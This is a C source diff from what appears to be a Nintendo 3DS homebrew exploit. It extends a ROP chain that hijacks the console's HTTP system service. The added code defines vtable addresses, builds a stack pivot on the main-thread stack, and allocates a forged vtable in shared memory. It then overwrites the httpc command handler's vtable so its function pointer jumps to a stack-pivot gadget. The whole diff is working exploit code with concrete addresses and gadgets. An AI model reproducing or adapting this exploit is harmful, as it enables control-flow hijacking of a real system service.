@@ -78,6 +78,9 @@ u32 ROP_HTTPC_CONTEXTSERVSESSION_OBJPTR_VTABLE = 0x0011b744;//Vtable for the obj
 
 u32 ROP_HTTPC_CMDHANDLER_OBJPTR_VTABLE_SIZE = 0x108;//Size of the vtable for the objptr from httpc_cmdhandler *(_this+16).
 
+u32 ROP_HTTPC_CMDHANDLEROBJ_VTABLE = 0x0011b854;//This is the vtable for the httpc_cmdhandler _this.
+u32 ROP_HTTPC_CMDHANDLEROBJ_VTABLE_SIZE = 0x148;
+
 static u32 ropvmem_base = 0x0f000000;
 u32 ropvmem_size = 0x10000;
 
@@ -748,6 +751,15 @@ Result init_hax_sharedmem(u32 *tmpbuf)
 	ropgen_setr0(&ropchain, &http_ropvaddr, tmpdata[1]);
 	ropgen_strr0r1(&ropchain, &http_ropvaddr, tmpdata_addr+4, 1);
 
+	//Setup the stack-pivot on the main-thread stack for the custom cmdhandler, located at <httpc_cmdhandler caller func> sp+0.
+	tmpdata_ptr = tmpdata;
+	tmpdata_addr = 0x0ffffe60-4;
+	ropgen_stackpivot(&tmpdata_ptr, &tmpdata_addr, ropvmem_base);
+	tmpdata_addr-= 8;
+
+	ropgen_setr0(&ropchain, &http_ropvaddr, tmpdata[1]);
+	ropgen_strr0r1(&ropchain, &http_ropvaddr, tmpdata_addr+4, 1);
+
 	ropgen_ldrr0r1(&ropchain, &http_ropvaddr, closecontext_stackframe + 0x14, 1);//Load the saved LR value in the httpc_cmdhandler func.
 	ropgen_add_r0ip(&ropchain, &http_ropvaddr, 0xc);//r0+= 0xc.
 	ropgen_strr0r1(&ropchain, &http_ropvaddr, closecontext_stackframe + 0x14, 1);//Write the modified LR value back into the stackframe. Hence, the code which writes to the cmd-reply data will be skipped over.
@@ -855,6 +867,7 @@ Result setuphaxx_httpheap_sharedmem(targeturlctx *first_targeturlctx)
 
 	u32 *condcallfunc_objaddr_sharedmemptr = NULL;
 	u32 *__custom_mainservsession_vtable_sharedmemptr = NULL;
+	u32 custom_cmdhandlervtable = 0, *custom_cmdhandlervtable_sharedmemptr = NULL;
 
 	targeturlctx *cur_targeturlctx;
 	u32 targeturl_list_vaddr;
@@ -876,6 +889,8 @@ Result setuphaxx_httpheap_sharedmem(targeturlctx *first_targeturlctx)
 	condcallfunc_objaddr = memalloc_ropvmem_dataheap(&mainrop_endaddr, &condcallfunc_objaddr_sharedmemptr, 0x8);
 
 	__custom_mainservsession_vtable = memalloc_ropvmem_dataheap(&mainrop_endaddr, &__custom_mainservsession_vtable_sharedmemptr, ROP_HTTPC_CMDHANDLER_OBJPTR_VTABLE_SIZE);
+
+	custom_cmdhandlervtable = memalloc_ropvmem_dataheap(&mainrop_endaddr, &custom_cmdhandlervtable_sharedmemptr, ROP_HTTPC_CMDHANDLEROBJ_VTABLE_SIZE);
 
 	targeturl_list_entcount = 0;
 	cur_targeturlctx = first_targeturlctx;
@@ -1177,8 +1192,26 @@ Result setuphaxx_httpheap_sharedmem(targeturlctx *first_targeturlctx)
 			ropgen_setr0(&ropchain, &ropvaddr, 0);
 			ropgen_strr0r1(&ropchain, &ropvaddr, 0, 0);//cmdreply[2](buffer descriptor) = curent->new_descriptorword_value.
 
-		ropgen_checkcond_necontinue_eqjump(&ropchain1, &ropvaddr1, ropvaddr);
 		ropgen_checkcond_necontinue_eqjump(&ropchain0, &ropvaddr0, ropvaddr);
+
+			ropgen_ldrr0r1(&ropchain, &ropvaddr, curent, 1);//Load curent->enable_customcmdhandler.
+			ropgen_add_r0ip(&ropchain, &ropvaddr, offsetof(targeturl_requestoverridectx, enable_customcmdhandler));
+			ropgen_movr1r0(&ropchain, &ropvaddr);
+			ropgen_ldrr0r1(&ropchain, &ropvaddr, 0, 0);
+
+			ropgen_popr1(&ropchain, &ropvaddr, 0);//if(<value loaded above> == 0)<skip over this block>
+			ropchain0 = ropchain;
+			ropvaddr0 = ropvaddr;
+			ropgen_checkcond_necontinue_eqjump(&ropchain, &ropvaddr, 0);
+
+				ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x4, 1);//r0 = _this (httpc cmdhandler object)
+				ropgen_add_r0ip(&ropchain, &ropvaddr, 0xfffffffc);//Overwrite the vtable for the above _this with custom_cmdhandlervtable.
+				ropgen_movr1r0(&ropchain, &ropvaddr);
+				ropgen_setr0(&ropchain, &ropvaddr, custom_cmdhandlervtable);
+				ropgen_strr0r1(&ropchain, &ropvaddr, 0, 0);
+
+		ropgen_checkcond_necontinue_eqjump(&ropchain0, &ropvaddr0, ropvaddr);
+		ropgen_checkcond_necontinue_eqjump(&ropchain1, &ropvaddr1, ropvaddr);
 
 	ropgen_ret2cmdhandler(&ropchain, &ropvaddr);
 
@@ -1219,6 +1252,11 @@ Result setuphaxx_httpheap_sharedmem(targeturlctx *first_targeturlctx)
 	ptr = __custom_mainservsession_vtable_sharedmemptr;
 	memcpy(ptr, &http_codebin_buf[ROP_HTTPC_MAINSERVSESSION_OBJPTR_VTABLE - 0x100000], ROP_HTTPC_CMDHANDLER_OBJPTR_VTABLE_SIZE);
 	ptr[0x8>>2] = ROP_ADDSPx154_MOVR0R4_POPR4R5R6R7R8R9SLFPPC;//Overwrite the vtable funcptr for CreateContext.
+
+	//Setup the custom vtable for the httpc cmdhandler.
+	ptr = custom_cmdhandlervtable_sharedmemptr;
+	memcpy(ptr, &http_codebin_buf[ROP_HTTPC_CMDHANDLEROBJ_VTABLE - 0x100000], ROP_HTTPC_CMDHANDLEROBJ_VTABLE_SIZE);
+	ptr[0x8>>2] = ROP_STACKPIVOT-4;//vtable funcptr for the actual httpc_cmdhandler function.
 
 	//Setup the custom vtables for context-sessions.
 	cur_targeturlctx = first_targeturlctx;
